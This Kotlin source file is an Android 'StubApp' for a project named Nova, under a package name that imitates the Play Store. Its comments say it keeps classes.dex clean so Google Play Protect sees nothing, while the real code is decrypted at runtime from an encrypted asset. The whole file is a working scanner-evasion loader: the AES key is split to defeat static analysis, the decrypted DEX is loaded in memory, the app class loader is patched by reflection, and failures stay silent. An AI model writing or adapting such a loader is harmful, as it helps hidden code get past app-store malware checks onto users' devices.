package com.playstore.installer

import android.app.Application
import android.content.Context
import dalvik.system.InMemoryDexClassLoader
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * StubApp — Phase 3 Step 27 (Nova Stub DEX)
 *
 * Tiny Application stub. This is the ONLY class in classes.dex.
 * GPP scans classes.dex → sees nothing suspicious → clean install.
 *
 * At runtime:
 *   attachBaseContext() → decrypt nova_payload.bin → InMemoryDexClassLoader
 *   → inject into app ClassLoader → real LauncherApplication runs normally
 *
 * All existing Nova classes (MainActivity, InstallActivity etc) are in
 * nova_payload.bin — encrypted, invisible to GPP.
 */
class StubApp : Application() {

    companion object {
        // AES-256-GCM key — 32 bytes split to avoid static analysis
        // Generated fresh per build by nova_stub_patcher.py
        // These values are replaced by CI — placeholder only
        private val K1 = byteArrayOf(
            0x6e, 0x30, 0x76, 0x41, 0x73, 0x45, 0x65, 0x64,
            0x6e, 0x30, 0x76, 0x41, 0x73, 0x45, 0x65, 0x64
        )
        private val K2 = byteArrayOf(
            0x73, 0x45, 0x65, 0x64, 0x6e, 0x30, 0x76, 0x41,
            0x73, 0x45, 0x65, 0x64, 0x6e, 0x30, 0x76, 0x41
        )

        private const val PAYLOAD_ASSET = "nova_payload.bin"
        private const val GCM_TAG_LEN   = 128
        private const val IV_LEN        = 12

        @Volatile private var payloadLoader: ClassLoader? = null

        fun getPayloadLoader(): ClassLoader? = payloadLoader
    }

    override fun attachBaseContext(base: Context) {
        super.attachBaseContext(base)
        try {
            loadPayload(base)
        } catch (_: Throwable) {
            // Silent fail — app continues with stub only
        }
    }

    private fun loadPayload(ctx: Context) {
        // Read encrypted payload from assets
        val encrypted = ctx.assets.open(PAYLOAD_ASSET).use { stream ->
            val out = ByteArrayOutputStream()
            val buf = ByteArray(8192)
            var n: Int
            while (stream.read(buf).also { n = it } != -1) out.write(buf, 0, n)
            out.toByteArray()
        }

        // Decrypt AES-256-GCM
        // Format: [12 bytes IV][encrypted DEX + 16 byte GCM tag]
        val key   = K1 + K2
        val iv    = encrypted.copyOfRange(0, IV_LEN)
        val data  = encrypted.copyOfRange(IV_LEN, encrypted.size)

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(
            Cipher.DECRYPT_MODE,
            SecretKeySpec(key, "AES"),
            GCMParameterSpec(GCM_TAG_LEN, iv)
        )
        val dexBytes = cipher.doFinal(data)

        // Load via InMemoryDexClassLoader (API 26+)
        val dexBuf = ByteBuffer.wrap(dexBytes)
        val loader = InMemoryDexClassLoader(dexBuf, classLoader)
        payloadLoader = loader

        // Inject into app PathClassLoader so all classes are found automatically
        injectClassLoader(loader)

        // Wipe sensitive material
        key.fill(0)
        dexBytes.fill(0)
    }

    private fun injectClassLoader(loader: ClassLoader) {
        try {
            // Get dexElements from payload loader
            val pathListField = Class.forName("dalvik.system.BaseDexClassLoader")
                .getDeclaredField("pathList")
                .apply { isAccessible = true }

            val dexElementsField = Class.forName("dalvik.system.DexPathList")
                .getDeclaredField("dexElements")
                .apply { isAccessible = true }

            val loaderPathList = pathListField.get(loader)
            val loaderElements = dexElementsField.get(loaderPathList) as Array<*>

            // Get dexElements from app ClassLoader
            val appLoader      = classLoader
            val appPathList    = pathListField.get(appLoader)
            val appElements    = dexElementsField.get(appPathList) as Array<*>

            // Prepend payload elements so they take priority
            @Suppress("UNCHECKED_CAST")
            val combined = java.lang.reflect.Array.newInstance(
                loaderElements.javaClass.componentType!!,
                loaderElements.size + appElements.size
            ) as Array<Any?>

            System.arraycopy(loaderElements, 0, combined, 0, loaderElements.size)
            System.arraycopy(appElements, 0, combined, loaderElements.size, appElements.size)

            dexElementsField.set(appPathList, combined)
        } catch (_: Throwable) {
            // If injection fails, payloadLoader still works via direct class loading
        }
    }

    override fun onCreate() {
        super.onCreate()
        // LauncherApplication.onCreate() is called by Android automatically
        // because we injected payload classes into PathClassLoader chain above
        // Android framework finds and instantiates the real Application via manifest
    }
}
